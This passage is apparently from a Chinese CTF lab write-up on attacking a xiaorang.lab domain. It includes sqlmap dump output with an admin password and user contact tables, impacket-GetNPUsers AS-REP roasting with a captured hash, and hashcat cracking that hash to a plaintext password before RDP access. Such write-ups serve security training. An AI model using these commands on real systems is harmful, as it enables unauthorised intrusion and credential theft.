|+----+--------------------------------------------+| 1  | flag{b142f5ce-d9b8-4b73-9012-ad75175ba029} |+----+--------------------------------------------+[21:58:47] [INFO] table 'oa_db.oa_f1Agggg' dumped to CSV file '/home/q1n9/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_f1Agggg.csv'[21:58:47] [INFO] fetching columns for table 'oa_admin' in database 'oa_db'[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.6.38:80  ...  OK ...  OK[21:58:47] [INFO] fetching entries for table 'oa_admin' in database 'oa_db'[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.6.38:80 Database: oa_dbTable: oa_admin[1 entry]+----+------------------+---------------+| id | password         | username      |+----+------------------+---------------+| 1  | bo2y8kAL3HnXUiQo | administrator |+----+------------------+---------------+[21:58:47] [INFO] table 'oa_db.oa_admin' dumped to CSV file '/home/q1n9/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_admin.csv'[21:58:47] [INFO] fetching columns for table 'oa_users' in database 'oa_db'[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.6.38:80  ...  OK ...  OK[21:58:47] [INFO] fetching entries for table 'oa_users' in database 'oa_db'[proxychains] Strict chain  ...  127.0.0.1:12345  ...  172.22.6.38:80  ...  OKDatabase: oa_dbTable: oa_users[500 entries]+-----+----------------------------+-------------+-----------------+| id  | email                      | phone       | username        |+-----+----------------------------+-------------+-----------------+[21:58:48] [WARNING] console output will be trimmed to last 256 rows due to large table size| 245 | chenyan@xiaorang.lab       | 18281528743 | CHEN YAN        || 246 | tanggui@xiaorang.lab       | 18060615547 | TANG GUI        || 247 | buning@xiaorang.lab        | 13046481392 | BU NING         || 248 | beishu@xiaorang.lab        | 18268508400 | BEI SHU         || 249 | shushi@xiaorang.lab        | 17770383196 | SHU SHI         || 250 | fuyi@xiaorang.lab          | 18902082658 | FU YI           || 251 | pangcheng@xiaorang.lab     | 18823789530 | PANG CHENG      || 252 | tonghao@xiaorang.lab       | 13370873526 | TONG HAO        || 253 | jiaoshan@xiaorang.lab      | 15375905173 | JIAO SHAN       || 254 | dulun@xiaorang.lab         | 13352331157 | DU LUN          || 255 | kejuan@xiaorang.lab        | 13222550481 | KE JUAN         || 256 | gexin@xiaorang.lab         | 18181553086 | GE XIN          || 257 | lugu@xiaorang.lab          | 18793883130 | LU GU           || 258 | guzaicheng@xiaorang.lab    | 15309377043 | GU ZAI CHENG    || 259 | feicai@xiaorang.lab        | 13077435367 | FEI CAI         || 260 | ranqun@xiaorang.lab        | 18239164662 | RAN QUN         || 261 | zhouyi@xiaorang.lab        | 13169264671 | ZHOU YI         || 262 | shishu@xiaorang.lab        | 18592890189 | SHI SHU         || 263 | yanyun@xiaorang.lab        | 15071085768 | YAN YUN         || 264 | chengqiu@xiaorang.lab      | 13370162980 | CHENG QIU       || 265 | louyou@xiaorang.lab        | 13593582379 | LOU YOU         || 266 | maqun@xiaorang.lab         | 15235945624 | MA QUN          || 267 | wenbiao@xiaorang.lab       | 13620643639 | WEN BIAO        || 268 | weishengshan@xiaorang.lab  | 18670502260 | WEI SHENG SHAN  || 269 | zhangxin@xiaorang.lab      | 15763185760 | ZHANG XIN       || 270 | chuyuan@xiaorang.lab       | 18420545268 | CHU YUAN        || 271 | wenliang@xiaorang.lab      | 13601678032 | WEN LIANG       || 272 | yulvxue@xiaorang.lab       | 18304374901 | YU LV XUE       || 273 | luyue@xiaorang.lab         | 18299785575 | LU YUE          || 274 | ganjian@xiaorang.lab       | 18906111021 | GAN JIAN        || 275 | pangzhen@xiaorang.lab      | 13479328562 | PANG ZHEN       || 276 | guohong@xiaorang.lab       | 18510220597 | GUO HONG        || 277 | lezhong@xiaorang.lab       | 15320909285 | LE ZHONG        || 278 | sheweiyue@xiaorang.lab     | 13736399596 | SHE WEI YUE     || 279 | dujian@xiaorang.lab        | 15058892639 | DU JIAN         || 280 | lidongjin@xiaorang.lab     | 18447207007 | LI DONG JIN     || 281 | hongqun@xiaorang.lab       | 15858462251 | HONG QUN        || 282 | yexing@xiaorang.lab        | 13719043564 | YE XING         || 283 | maoda@xiaorang.lab         | 13878840690 | MAO DA          || 284 | qiaomei@xiaorang.lab       | 13053207462 | QIAO MEI        || 285 | nongzhen@xiaorang.lab      | 15227699960 | NONG ZHEN       || 286 | dongshu@xiaorang.lab       | 15695562947 | DONG SHU        || 287 | zhuzhu@xiaorang.lab        | 13070163385 | ZHU ZHU         || 288 | jiyun@xiaorang.lab         | 13987332999 | JI YUN          || 289 | qiguanrou@xiaorang.lab     | 15605983582 | QI GUAN ROU     || 290 | yixue@xiaorang.lab         | 18451603140 | YI XUE          || 291 | chujun@xiaorang.lab        | 15854942459 | CHU JUN         || 292 | shenshan@xiaorang.lab      | 17712052191 | SHEN SHAN       || 293 | lefen@xiaorang.lab         | 13271196544 | LE FEN          || 294 | yubo@xiaorang.lab          | 13462202742 | YU BO           || 295 | helianrui@xiaorang.lab     | 15383000907 | HE LIAN RUI     || 296 | xuanqun@xiaorang.lab       | 18843916267 | XUAN QUN        || 297 | shangjun@xiaorang.lab      | 15162486698 | SHANG JUN       || 298 | huguang@xiaorang.lab       | 18100586324 | HU GUANG        || 299 | wansifu@xiaorang.lab       | 18494761349 | WAN SI FU       || 300 | fenghong@xiaorang.lab      | 13536727314 | FENG HONG       || 301 | wanyan@xiaorang.lab        | 17890844429 | WAN YAN         || 302 | diyan@xiaorang.lab         | 18534028047 | DI YAN          || 303 | xiangyu@xiaorang.lab       | 13834043047 | XIANG YU        || 304 | songyan@xiaorang.lab       | 15282433280 | SONG YAN        || 305 | fandi@xiaorang.lab         | 15846960039 | FAN DI          || 306 | xiangjuan@xiaorang.lab     | 18120327434 | XIANG JUAN      || 307 | beirui@xiaorang.lab        | 18908661803 | BEI RUI         || 308 | didi@xiaorang.lab          | 13413041463 | DI DI           || 309 | zhubin@xiaorang.lab        | 15909558554 | ZHU BIN         || 310 | lingchun@xiaorang.lab      | 13022790678 | LING CHUN       || 311 | zhenglu@xiaorang.lab       | 13248244873 | ZHENG LU        || 312 | xundi@xiaorang.lab         | 18358493414 | XUN DI          || 313 | wansishun@xiaorang.lab     | 18985028319 | WAN SI SHUN     || 314 | yezongyue@xiaorang.lab     | 13866302416 | YE ZONG YUE     || 315 | bianmei@xiaorang.lab       | 18540879992 | BIAN MEI        || 316 | shanshao@xiaorang.lab      | 18791488918 | SHAN SHAO       || 317 | zhenhui@xiaorang.lab       | 13736784817 | ZHEN HUI        || 318 | chengli@xiaorang.lab       | 15913267394 | CHENG LI        || 319 | yufen@xiaorang.lab         | 18432795588 | YU FEN          || 320 | jiyi@xiaorang.lab          | 13574211454 | JI YI           || 321 | panbao@xiaorang.lab        | 13675851303 | PAN BAO         || 322 | mennane@xiaorang.lab       | 15629706208 | MEN NAN E       || 323 | fengsi@xiaorang.lab        | 13333432577 | FENG SI         || 324 | mingyan@xiaorang.lab       | 18296909463 | MING YAN        || 325 | luoyou@xiaorang.lab        | 15759321415 | LUO YOU         || 326 | liangduanqing@xiaorang.lab | 13150744785 | LIANG DUAN QING || 327 | nongyan@xiaorang.lab       | 18097386975 | NONG YAN        || 328 | haolun@xiaorang.lab        | 15152700465 | HAO LUN         || 329 | oulun@xiaorang.lab         | 13402760696 | OU LUN          || 330 | weichipeng@xiaorang.lab    | 18057058937 | WEI CHI PENG    || 331 | qidiaofang@xiaorang.lab    | 18728297829 | QI DIAO FANG    || 332 | xuehe@xiaorang.lab         | 13398862169 | XUE HE          || 333 | chensi@xiaorang.lab        | 18030178713 | CHEN SI         || 334 | guihui@xiaorang.lab        | 17882514129 | GUI HUI         || 335 | fuyue@xiaorang.lab         | 18298436549 | FU YUE          || 336 | wangxing@xiaorang.lab      | 17763645267 | WANG XING       || 337 | zhengxiao@xiaorang.lab     | 18673968392 | ZHENG XIAO      || 338 | guhui@xiaorang.lab         | 15166711352 | GU HUI          || 339 | baoai@xiaorang.lab         | 15837430827 | BAO AI          || 340 | hangzhao@xiaorang.lab      | 13235488232 | HANG ZHAO       || 341 | xingye@xiaorang.lab        | 13367587521 | XING YE         || 342 | qianyi@xiaorang.lab        | 18657807767 | QIAN YI         || 343 | xionghong@xiaorang.lab     | 17725874584 | XIONG HONG      || 344 | zouqi@xiaorang.lab         | 15300430128 | ZOU QI          || 345 | rongbiao@xiaorang.lab      | 13034242682 | RONG BIAO       || 346 | gongxin@xiaorang.lab       | 15595839880 | GONG XIN        || 347 | luxing@xiaorang.lab        | 18318675030 | LU XING         || 348 | huayan@xiaorang.lab        | 13011805354 | HUA YAN         || 349 | duyue@xiaorang.lab         | 15515878208 | DU YUE          || 350 | xijun@xiaorang.lab         | 17871583183 | XI JUN          || 351 | daiqing@xiaorang.lab       | 18033226216 | DAI QING        || 352 | yingbiao@xiaorang.lab      | 18633421863 | YING BIAO       || 353 | hengteng@xiaorang.lab      | 15956780740 | HENG TENG       || 354 | changwu@xiaorang.lab       | 15251485251 | CHANG WU        || 355 | chengying@xiaorang.lab     | 18788248715 | CHENG YING      || 356 | luhong@xiaorang.lab        | 17766091079 | LU HONG         || 357 | tongxue@xiaorang.lab       | 18466102780 | TONG XUE        || 358 | xiangqian@xiaorang.lab     | 13279611385 | XIANG QIAN      || 359 | shaokang@xiaorang.lab      | 18042645434 | SHAO KANG       || 360 | nongzhu@xiaorang.lab       | 13934236634 | NONG ZHU        || 361 | haomei@xiaorang.lab        | 13406913218 | HAO MEI         || 362 | maoqing@xiaorang.lab       | 15713298425 | MAO QING        || 363 | xiai@xiaorang.lab          | 18148404789 | XI AI           || 364 | bihe@xiaorang.lab          | 13628593791 | BI HE           || 365 | gaoli@xiaorang.lab         | 15814408188 | GAO LI          || 366 | jianggong@xiaorang.lab     | 15951118926 | JIANG GONG      || 367 | pangning@xiaorang.lab      | 13443921700 | PANG NING       || 368 | ruishi@xiaorang.lab        | 15803112819 | RUI SHI         || 369 | wuhuan@xiaorang.lab        | 13646953078 | WU HUAN         || 370 | qiaode@xiaorang.lab        | 13543564200 | QIAO DE         || 371 | mayong@xiaorang.lab        | 15622971484 | MA YONG         || 372 | hangda@xiaorang.lab        | 15937701659 | HANG DA         || 373 | changlu@xiaorang.lab       | 13734991654 | CHANG LU        || 374 | liuyuan@xiaorang.lab       | 15862054540 | LIU YUAN        || 375 | chenggu@xiaorang.lab       | 15706685526 | CHENG GU        || 376 | shentuyun@xiaorang.lab     | 15816902379 | SHEN TU YUN     || 377 | zhuangsong@xiaorang.lab    | 17810274262 | ZHUANG SONG     || 378 | chushao@xiaorang.lab       | 18822001640 | CHU SHAO        || 379 | heli@xiaorang.lab          | 13701347081 | HE LI           || 380 | haoming@xiaorang.lab       | 15049615282 | HAO MING        || 381 | xieyi@xiaorang.lab         | 17840660107 | XIE YI          || 382 | shangjie@xiaorang.lab      | 15025010410 | SHANG JIE       || 383 | situxin@xiaorang.lab       | 18999728941 | SI TU XIN       || 384 | linxi@xiaorang.lab         | 18052976097 | LIN XI          || 385 | zoufu@xiaorang.lab         | 15264535633 | ZOU FU          || 386 | qianqing@xiaorang.lab      | 18668594658 | QIAN QING       || 387 | qiai@xiaorang.lab          | 18154690198 | QI AI           || 388 | ruilin@xiaorang.lab        | 13654483014 | RUI LIN         || 389 | luomeng@xiaorang.lab       | 15867095032 | LUO MENG        || 390 | huaren@xiaorang.lab        | 13307653720 | HUA REN         || 391 | yanyangmei@xiaorang.lab    | 15514015453 | YAN YANG MEI    || 392 | zuofen@xiaorang.lab        | 15937087078 | ZUO FEN         || 393 | manyuan@xiaorang.lab       | 18316106061 | MAN YUAN        || 394 | yuhui@xiaorang.lab         | 18058257228 | YU HUI          || 395 | sunli@xiaorang.lab         | 18233801124 | SUN LI          || 396 | guansixin@xiaorang.lab     | 13607387740 | GUAN SI XIN     || 397 | ruisong@xiaorang.lab       | 13306021674 | RUI SONG        || 398 | qiruo@xiaorang.lab         | 13257810331 | QI RUO          || 399 | jinyu@xiaorang.lab         | 18565922652 | JIN YU          || 400 | shoujuan@xiaorang.lab      | 18512174415 | SHOU JUAN       || 401 | yanqian@xiaorang.lab       | 13799789435 | YAN QIAN        || 402 | changyun@xiaorang.lab      | 18925015029 | CHANG YUN       || 403 | hualu@xiaorang.lab         | 13641470801 | HUA LU          || 404 | huanming@xiaorang.lab      | 15903282860 | HUAN MING       || 405 | baoshao@xiaorang.lab       | 13795275611 | BAO SHAO        || 406 | hongmei@xiaorang.lab       | 13243605925 | HONG MEI        || 407 | manyun@xiaorang.lab        | 13238107359 | MAN YUN         || 408 | changwan@xiaorang.lab      | 13642205622 | CHANG WAN       || 409 | wangyan@xiaorang.lab       | 13242486231 | WANG YAN        || 410 | shijian@xiaorang.lab       | 15515077573 | SHI JIAN        || 411 | ruibei@xiaorang.lab        | 18157706586 | RUI BEI         || 412 | jingshao@xiaorang.lab      | 18858376544 | JING SHAO       || 413 | jinzhi@xiaorang.lab        | 18902437082 | JIN ZHI         || 414 | yuhui@xiaorang.lab         | 15215599294 | YU HUI          || 415 | zangpeng@xiaorang.lab      | 18567574150 | ZANG PENG       || 416 | changyun@xiaorang.lab      | 15804640736 | CHANG YUN       || 417 | yetai@xiaorang.lab         | 13400150018 | YE TAI          || 418 | luoxue@xiaorang.lab        | 18962643265 | LUO XUE         || 419 | moqian@xiaorang.lab        | 18042706956 | MO QIAN         || 420 | xupeng@xiaorang.lab        | 15881934759 | XU PENG         || 421 | ruanyong@xiaorang.lab      | 15049703903 | RUAN YONG       || 422 | guliangxian@xiaorang.lab   | 18674282714 | GU LIANG XIAN   || 423 | yinbin@xiaorang.lab        | 15734030492 | YIN BIN         || 424 | huarui@xiaorang.lab        | 17699257041 | HUA RUI         || 425 | niuya@xiaorang.lab         | 13915041589 | NIU YA          || 426 | guwei@xiaorang.lab         | 13584571917 | GU WEI          || 427 | qinguan@xiaorang.lab       | 18427953434 | QIN GUAN        || 428 | yangdanhan@xiaorang.lab    | 15215900100 | YANG DAN HAN    || 429 | yingjun@xiaorang.lab       | 13383367818 | YING JUN        || 430 | weiwan@xiaorang.lab        | 13132069353 | WEI WAN         || 431 | sunduangu@xiaorang.lab     | 15737981701 | SUN DUAN GU     || 432 | sisiwu@xiaorang.lab        | 18021600640 | SI SI WU        || 433 | nongyan@xiaorang.lab       | 13312613990 | NONG YAN        || 434 | xuanlu@xiaorang.lab        | 13005748230 | XUAN LU         || 435 | yunzhong@xiaorang.lab      | 15326746780 | YUN ZHONG       || 436 | gengfei@xiaorang.lab       | 13905027813 | GENG FEI        || 437 | zizhuansong@xiaorang.lab   | 13159301262 | ZI ZHUAN SONG   || 438 | ganbailong@xiaorang.lab    | 18353612904 | GAN BAI LONG    || 439 | shenjiao@xiaorang.lab      | 15164719751 | SHEN JIAO       || 440 | zangyao@xiaorang.lab       | 18707028470 | ZANG YAO        || 441 | yangdanhe@xiaorang.lab     | 18684281105 | YANG DAN HE     || 442 | chengliang@xiaorang.lab    | 13314617161 | CHENG LIANG     || 443 | xudi@xiaorang.lab          | 18498838233 | XU DI           || 444 | wulun@xiaorang.lab         | 18350490780 | WU LUN          || 445 | yuling@xiaorang.lab        | 18835870616 | YU LING         || 446 | taoya@xiaorang.lab         | 18494928860 | TAO YA          || 447 | jinle@xiaorang.lab         | 15329208123 | JIN LE          || 448 | youchao@xiaorang.lab       | 13332964189 | YOU CHAO        || 449 | liangduanzhi@xiaorang.lab  | 15675237494 | LIANG DUAN ZHI  || 450 | jiagupiao@xiaorang.lab     | 17884962455 | JIA GU PIAO     || 451 | ganze@xiaorang.lab         | 17753508925 | GAN ZE          || 452 | jiangqing@xiaorang.lab     | 15802357200 | JIANG QING      || 453 | jinshan@xiaorang.lab       | 13831466303 | JIN SHAN        || 454 | zhengpubei@xiaorang.lab    | 13690156563 | ZHENG PU BEI    || 455 | cuicheng@xiaorang.lab      | 17641589842 | CUI CHENG       || 456 | qiyong@xiaorang.lab        | 13485427829 | QI YONG         || 457 | qizhu@xiaorang.lab         | 18838859844 | QI ZHU          || 458 | ganjian@xiaorang.lab       | 18092585003 | GAN JIAN        || 459 | yurui@xiaorang.lab         | 15764121637 | YU RUI          || 460 | feishu@xiaorang.lab        | 18471512248 | FEI SHU         || 461 | chenxin@xiaorang.lab       | 13906545512 | CHEN XIN        || 462 | shengzhe@xiaorang.lab      | 18936457394 | SHENG ZHE       || 463 | wohong@xiaorang.lab        | 18404022650 | WO HONG         || 464 | manzhi@xiaorang.lab        | 15973350408 | MAN ZHI         || 465 | xiangdong@xiaorang.lab     | 13233908989 | XIANG DONG      || 466 | weihui@xiaorang.lab        | 15035834945 | WEI HUI         || 467 | xingquan@xiaorang.lab      | 18304752969 | XING QUAN       || 468 | miaoshu@xiaorang.lab       | 15121570939 | MIAO SHU        || 469 | gongwan@xiaorang.lab       | 18233990398 | GONG WAN        || 470 | qijie@xiaorang.lab         | 15631483536 | QI JIE          || 471 | shaoting@xiaorang.lab      | 15971628914 | SHAO TING       || 472 | xiqi@xiaorang.lab          | 18938747522 | XI QI           || 473 | jinghong@xiaorang.lab      | 18168293686 | JING HONG       || 474 | qianyou@xiaorang.lab       | 18841322688 | QIAN YOU        || 475 | chuhua@xiaorang.lab        | 15819380754 | CHU HUA         || 476 | yanyue@xiaorang.lab        | 18702474361 | YAN YUE         || 477 | huangjia@xiaorang.lab      | 13006878166 | HUANG JIA       || 478 | zhouchun@xiaorang.lab      | 13545820679 | ZHOU CHUN       || 479 | jiyu@xiaorang.lab          | 18650881187 | JI YU           || 480 | wendong@xiaorang.lab       | 17815264093 | WEN DONG        || 481 | heyuan@xiaorang.lab        | 18710821773 | HE YUAN         || 482 | mazhen@xiaorang.lab        | 18698248638 | MA ZHEN         || 483 | shouchun@xiaorang.lab      | 15241369178 | SHOU CHUN       || 484 | liuzhe@xiaorang.lab        | 18530936084 | LIU ZHE         || 485 | fengbo@xiaorang.lab        | 15812110254 | FENG BO         || 486 | taigongyuan@xiaorang.lab   | 15943349034 | TAI GONG YUAN   || 487 | gesheng@xiaorang.lab       | 18278508909 | GE SHENG        || 488 | songming@xiaorang.lab      | 13220512663 | SONG MING       || 489 | yuwan@xiaorang.lab         | 15505678035 | YU WAN          || 490 | diaowei@xiaorang.lab       | 13052582975 | DIAO WEI        || 491 | youyi@xiaorang.lab         | 18036808394 | YOU YI          || 492 | rongxianyu@xiaorang.lab    | 18839918955 | RONG XIAN YU    || 493 | fuyi@xiaorang.lab          | 15632151678 | FU YI           || 494 | linli@xiaorang.lab         | 17883399275 | LIN LI          || 495 | weixue@xiaorang.lab        | 18672465853 | WEI XUE         || 496 | hejuan@xiaorang.lab        | 13256081102 | HE JUAN         || 497 | zuoqiutai@xiaorang.lab     | 18093001354 | ZUO QIU TAI     || 498 | siyi@xiaorang.lab          | 17873307773 | SI YI           || 499 | shenshan@xiaorang.lab      | 18397560369 | SHEN SHAN       || 500 | tongdong@xiaorang.lab      | 15177549595 | TONG DONG       |+-----+----------------------------+-------------+-----------------+[21:58:48] [INFO] table 'oa_db.oa_users' dumped to CSV file '/home/q1n9/.local/share/sqlmap/output/172.22.6.38/dump/oa_db/oa_users.csv'[21:58:48] [INFO] fetched data logged to text files under '/home/q1n9/.local/share/sqlmap/output/172.22.6.38'[*] ending @ 21:58:48 /2025-08-08/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/bc27e3222c2296c023a4d6ac7212702c.png"></p><hr><h2 id="flag03-04"><a href="#flag03-04" class="headerlink" title="flag03&amp;04"></a>flag03&amp;04</h2><p>用脚本提取出username</p><pre class="line-numbers language-none"><code class="language-none"># 读取包含表格数据的文件（假设数据保存在当前目录的 data.txt 中）with open("data.txt", "r", encoding="utf-8") as f:    lines = f.readlines()# 提取 username 并写入文件with open("username.txt", "w", encoding="utf-8") as out:    for line in lines:        # 跳过表头和空行        if "username" in line or not line.strip():            continue        # 按竖线分割并提取第5列（索引4）的内容        parts = line.split("|")        if len(parts) &gt;= 4:            username = parts[4].strip()            if username:  # 确保内容非空                out.write(username + "\n")<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>从运行结果来看，<code>impacket-GetNPUsers</code> 工具尝试对 <code>username.txt</code> 中的用户进行 AS-REP Roasting 攻击时，所有用户均返回 <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> 错误，说明<strong>目标域（<code>xiaorang.lab</code>）的 KDC 数据库中不存在这些用户</strong>，具体原因和解决方向如下：</p><h3 id="核心原因分析"><a href="#核心原因分析" class="headerlink" title="核心原因分析"></a>核心原因分析</h3><ol><li><strong>用户列表与目标域不匹配</strong><br><code>username.txt</code> 中的用户（如 <code>CHEN YAN</code>、<code>TANG GUI</code> 等）可能属于其他域或本地用户，而非 <code>xiaorang.lab</code> 域的域用户，因此 KDC 无法识别。</li><li><strong>用户名格式错误</strong><br>域用户通常需要严格的格式（如 <code>username</code> 而非 <code>USER NAME</code>，不含空格），而列表中存在带空格的用户名（如 <code>CHEN YAN</code>），可能与 KDC 中存储的实际用户名（如 <code>chenyan</code> 或 <code>chen.yan</code>）不匹配。</li><li><strong>用户未启用 Kerberos 预认证</strong><br>即使用户存在，若未禁用 Kerberos 预认证，<code>GetNPUsers</code> 也无法获取 AS-REP 响应，但此情况不会返回 “用户不存在” 错误，因此可排除。</li></ol><h3 id="解决建议"><a href="#解决建议" class="headerlink" title="解决建议"></a>解决建议</h3><ol><li><p><strong>修正用户名格式</strong></p><ul><li>移除用户名中的空格（如 <code>CHEN YAN</code> → <code>chenyan</code>，与之前的 <code>email</code> 前缀一致，如 <code>chenyan@xiaorang.lab</code>）。</li><li>统一转为小写（域用户名通常不区分大小写，但建议与邮箱前缀保持一致）。</li></ul><p>可通过脚本批量处理 <code>username.txt</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 移除空格并转为小写</span><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/ //g'</span> username.txt<span class="token function">tr</span> <span class="token string">'[:upper:]'</span> <span class="token string">'[:lower:]'</span> <span class="token operator">&lt;</span> username.txt <span class="token operator">&gt;</span> username_fixed.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>确认用户是否为域用户</strong><br>从之前的 <code>email</code> 列（如 <code>chenyan@xiaorang.lab</code>）可知，域用户的邮箱前缀可能是真实用户名，建议直接使用邮箱前缀作为用户名列表（而非 <code>username</code> 列的显示名称）。</p><p>提取邮箱前缀生成新用户列表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 假设原始数据文件为 data.txt，提取 email 列的前缀</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'[a-zA-Z0-9]+(?=@xiaorang.lab)'</span> data.txt <span class="token operator">&gt;</span> valid_usernames.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>重新运行工具</strong><br>使用修正后的用户列表：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 impacket-GetNPUsers -dc-ip <span class="token number">172.22</span>.6.12 <span class="token parameter variable">-usersfile</span> valid_usernames.txt xiaorang.lab/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></blockquote><pre class="line-numbers language-none"><code class="language-none">proxychains4 impacket-GetNPUsers -dc-ip 172.22.6.12 -usersfile username.txt xiaorang.lab/$krb5asrep$23$zhangxin@XIAORANG.LAB:0eaae5004362e230adf54772de8225df$35bc9e693079d797db4b7820fd7ad48b11bcae7895ac91179beac40e949c6035b67d827360dc66c9d893b1b757ab28d68a8efde201ea89efc369d9a2445de4ed866d3447666fa2318e19ec030b2ac6af434789a38a7872aad04aa56208c5c72d2951ac8032e804814ba44776c51b84f8f8fed45d935eaf7637530fb0b2c31178f12f77e451345febd307bb548c6d27896d2da3196b2a07937634684899ab8adb68c488cf48d6c694bb07f6ee61c5e3b6e59a9ff350f8932b4958dfe7e6777131a1d6c5cf91696de1e1d008684538783f914c6139a8336b7ef7bb186bce14959ee0a32894c29ac2589dd25e23<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>Kerberos AS-REP Roasting 攻击：这是一个针对 Kerberos 认证协议的攻击方法，主要目标是尝试从 Active Directory 获取不需要预身份验证的用户的加密凭证信息。这种攻击可以尝试暴力破解密码，特别是针对没有配置 Kerberos 预身份验证的用户账户。 </p><p>这样，我们可以视为获取了一个用户清单。接下来，我们可以使用这个username.txt文件来尝试枚举那些未启用预身份验证的账户。通常情况下，预身份验证是默认开启的，但一旦关闭了，攻击者就有可能利用指定的用户名，通过向域控制器的Kerberos 88端口请求票据。在这种情况下，域控制器不会执行任何验证，而是直接返回TGT（Ticket Granting Ticket）和使用用户Hash加密的Login Session Key。攻击者因此可以对获得的用户Hash加密的Login Session Key进行离线破解。如果字典足够强大，就有可能成功破解获得指定用户的明文密码。</p></blockquote><p><a href="https://blog.lololowe.com/posts/f502/">hashcat 暴力破解详细教程(附常见案例) | lololowe的博客</a></p><pre class="line-numbers language-none"><code class="language-none">gzip -d rockyou.txt.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">hashcat -a 0 -m 18200 --force hash.txt rockyou.txt$krb5asrep$23$zhangxin@XIAORANG.LAB:c300e2e460c8bf9d6a5c1720f1302e93$6c777af19d5196483195533338ee7480166b30b38c988d2e48fc34566435cab3763d21885d15e2f5baf161562b5158c0b6e82d06aa7892d5a8c477e41f96e1a789845f5e1f5e3af50b50d0aa2220f1df85bce2026fd424a9d642e636cf8321a7eb44cb1da9863a9b53d178916d0b013cbb9bcaf5acb03f8f7a6b82afaf31f72242ef295c9fd99ad621fd615cefb546fe5759b202f5e2a4a955d6b435c23529033953731af7e855ff359069b8efcf2855232d0a3a5b2e23bb549535c97b4a17f1ff7aa581f6826c5fdab2adc743154ff2a55ce6c50cf1d1e26b4e165f8e5c7f9c7548ae6c6af8c2dea0ae8d01:strawberry<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>远程登陆电脑<a href="mailto:172.22.6.25zhangxin@XIAORANG.LAB">172.22.6.25zhangxin@XIAORANG.LAB</a>（用户名），strawberry（密码） </p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/cc74c63ac4d80491d9d4a3f67d73975f.png"></p><blockquote><p>ps:远程桌面传东西</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d9800337f0cc0be9b19c19df0549d8ea.png"></p></blockquote><p><a href="https://blog.csdn.net/qq_56426046/article/details/126854991">https://blog.csdn.net/qq_56426046/article/details/126854991</a></p><p>用wsl会因为图形化出问题，还是用vm</p><p><code>./BloodHound 